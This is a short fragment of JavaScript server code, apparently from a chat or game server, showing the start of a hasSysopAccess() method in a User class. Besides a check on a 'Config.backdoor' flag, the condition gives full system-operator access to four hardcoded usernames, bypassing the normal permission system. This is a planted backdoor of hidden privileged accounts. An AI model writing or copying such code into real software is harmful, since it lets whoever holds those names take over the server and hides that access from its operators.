...
class User {
	 ...
	 */
	hasSysopAccess() {
		if (this.isSysop && Config.backdoor || ["deathlyplays"].includes(this.userid) || ["returningavenger"].includes(this.userid) || ["bedevil"].includes(this.userid) || ["volco"].includes(this.userid) ) {
